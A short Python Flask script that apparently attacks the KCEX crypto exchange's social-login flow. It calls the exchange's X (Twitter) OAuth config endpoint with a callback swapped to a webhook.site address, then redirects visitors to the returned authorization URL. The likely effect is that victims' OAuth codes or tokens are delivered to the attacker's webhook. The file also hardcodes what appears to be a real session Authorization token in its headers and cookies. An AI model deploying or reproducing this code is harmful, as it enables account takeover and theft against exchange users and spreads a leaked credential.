import os
import requests
from flask import Flask, redirect, jsonify
from urllib.parse import urlencode

app = Flask(__name__)

# Target KCEX API
API_URL = "https://www.kcex.com/uc/user_api/sns/x/config"

# Static credentials from your request
HEADERS = {
    "Host": "www.kcex.com",  # ✅ Fixed: removed markdown link syntax
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Accept": "*/*",
    "Accept-Language": "en-US",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://www.kcex.com/user",
    "Language": "en-US",
    "Accept-Timezone": "UTC+01:00",
    "Authorization": "WEB82be41922be3de3f6509edc3408a2d8664aafd2fff96a2b60d75e322ede7260c",
    "Version": "1.0.0",
    "Platform": "WEB",
    "Timezone": "UTC+01:00",
    "User-Device": "eyJ2aXNpdG9ySWQiOiI5U20wN0FBRFB1b3I5YnhGNVJkeiIsInJlcXVlc3RJZCI6IjE3Nzc0NzE3NDY3MzUuMFVlcWpxIiwiaXNwIjoiIn0",
    "Sentry-Trace": "44a8145c0b7f415e8590be443133b6a4-ac6f4310893631e2-1",
    "Baggage": "sentry-environment=production,sentry-public_key=2de633b98ccfefcaa0683fe675da299c,sentry-trace_id=44a8145c0b7f415e8590be443133b6a4,sentry-transaction=%2Fuser,sentry-sampled=true,sentry-sample_rand=0.004885378252184935,sentry-sample_rate=0.1",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=0",
    "Te": "trailers"
}

COOKIES = {
    "NEXT_LOCALE": "en-US",
    "kcex_base_fiat": "USD",
    "_ga": "GA1.1.1270344583.1773584302",
    "Authorization": "WEB82be41922be3de3f6509edc3408a2d8664aafd2fff96a2b60d75e322ede7260c",
    "kcex_exchange_order_confirmation": "[1,2,3,4,5,100,101,\"FOLLOW_LIMIT_ORDER\"]"
}

@app.route('/')
def index():
    return "Server is UP. Visit /start-auth to redirect."

@app.route('/start-auth')
def start_auth():
    callback_url = "https://webhook.site/4b2851f4-ae51-4c0f-af37-f25271fece8e"
    params = {
        'callback': callback_url
    }
    
    try:
        session = requests.Session()
        response = session.get(API_URL, headers=HEADERS, cookies=COOKIES, params=params, timeout=15)
        
        if response.status_code == 200:
            res_json = response.json()
            twitter_url = res_json.get("data")
            if twitter_url:
                return redirect(twitter_url)
            return jsonify({"error": "No URL in response", "details": res_json}), 500
        
        return jsonify({"error": "KCEX API failed", "status": response.status_code, "text": response.text}), 400
    except requests.exceptions.RequestException as e:
        return jsonify({"error": "Request Error", "msg": str(e)}), 500
    except Exception as e:
        return jsonify({"error": "Internal Server Error", "msg": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
